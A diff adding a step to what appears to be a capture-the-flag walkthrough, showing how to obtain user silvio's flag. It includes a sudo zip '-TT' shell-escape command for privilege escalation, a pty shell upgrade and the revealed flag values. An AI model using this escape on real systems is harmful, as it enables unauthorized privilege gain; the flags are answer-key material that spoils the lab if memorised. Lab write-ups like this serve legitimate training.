@@ -175,6 +175,15 @@ cat flag.txt
 dalia{4a94a7a7bb4a819a63a33979926c77dc}
 
 
+- What is silvio's flag?
+hint: TF=$(mktemp -u)
+sudo -u silvio zip $TF /etc/hosts -T -TT 'sh #'
+whoami
+id
+python3 -c ‘import pty;pty.spawn(“/bin/bash”)’
+cat flag.txt
+silvio{657b4d058c03ab9988875bc937f9c2ef}
+
 
 
 
